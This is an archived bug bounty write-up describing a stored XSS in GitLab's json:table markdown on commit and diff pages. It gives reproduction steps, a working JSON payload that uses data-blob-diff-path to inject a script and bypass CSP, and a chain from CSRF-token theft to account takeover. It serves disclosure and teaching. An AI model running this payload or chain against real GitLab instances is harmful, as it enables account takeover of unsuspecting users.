# Gitlab XSS Using json

- **Source URL:** https://medium.com/@justas_b1/gitlab-xss-using-json-table-markdown-worth-13-950-commits-page-93104473620e?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250913191307/https://medium.com/@justas_b1/gitlab-xss-using-json-table-markdown-worth-13-950-commits-page-93104473620e
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10559 (id 10559)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Gitlab XSS Using json:table Markdown — Worth $13,950 — Commit Page

To preface this, I want to say that finding this wasn’t easy, as I had to sift through many different .vue files on [https://gitlab.com/gitlab-org/gitlab](https://gitlab.com/gitlab-org/gitlab). It’s not one of these “I earned $100,000 in 5 minutes” articles.

Gitlab has very high security standards, and for that reason it’s used by many top tier companies like **Amazon, Apple, Google, Microsoft, Walmart, NVIDIA, IBM, NASA, Goldman Sachs, and Verizon**, etc.

In early February, Gitlab [added new functionality](https://gitlab.com/gitlab-org/gitlab/-/commit/ef7adda3dcfbfd10abe18ebf6ecfd31f7b8b782f), json:table, which allowed markdown rendering. It used v-safe-html to display cell data, but it didn’t have correct configuration and allowed arbitrary data and style attributes.

```
 <template v-if="isHtmlSafe" #cell()="data">
    <div v-safe-html="data.value"></div>
  </template>
```
Here, we can see that if isHtmlSafe is true, then it uses unmodified v-safe-html directive.

This combined with data-blob-diff-path led to XSS and CSP bypass on merge requests diff/single commit page.

## Steps to reproduce (taken from H1 report)

1. Create a project
2. Create a HTML file with XSS payload \<script>alert(document.domain)\</script>
3. Copy the HTML files partial raw path, example: /xtest11/fgdfg45/-/raw/0300d264c03217354162d16f96387e9ee35ec21b/sdfsdf.html
4. Create any merge request and go to commit page (a page where file diffs are located)
5. Add any comment, like “123”
6. Have victim visit the commit/diff page
7. They should see your comment “123”
8. While they are at the commit/diff page, I.E they have it opened on a browser tab
9. Replace your original comment with XSS payload:

````
\```json:table
{
  "fields": [
    {"key": "name", "label": "Name"},
    {"key": "email", "label": "Email"},
    {"key": "role", "label": "Role"}
  ],
  "items": [
    {
      "name": "<b>Bob</b>",
      "email": "<i class=\"diff-file diff-collapsed\" data-blob-diff-path=\"/xtest11/fgdfg45/-/raw/0300d264c03217354162d16f96387e9ee35ec21b/sdfsdf.html\"><a class=\"js-unfold\" style=\"position:fixed;transform:translate3d(-2000px,-5000px,0px);width:10000px;height:20000px\">",
      "role": "User"
    }
  ],
  "isHtmlSafe": true 
}
\```
````
The data-blob-diff-path contains link to raw html data and on clicking the a element with class .js-unfold, the raw html data (XSS payload) gets added to json:table.

After changing comment, the auto/real-time refresh triggers, and renders XSS payload table for both attacker and victim, bypassing CSP.

This happens only once, if victim refreshes page, they should see un-rendered json:table code. However, if victim clicks anywhere on the page, trying to navigate away without refreshing, they should trigger XSS.

Attacker could have automated adding/editing new comments and creating new, invisible, full page HTML elements every N seconds. This would’ve increased success rate exponentially.

## Why is XSS dangerous?

By using XSS, attacker can automatically steal CSRF token, and redirect victim to malicious html page that contains form which auto-submits a POST request to “-/profile/emails” endpoint, which has no CSRF protection headers.

This adds a secondary email to victims account which can later be used to perform ATO.
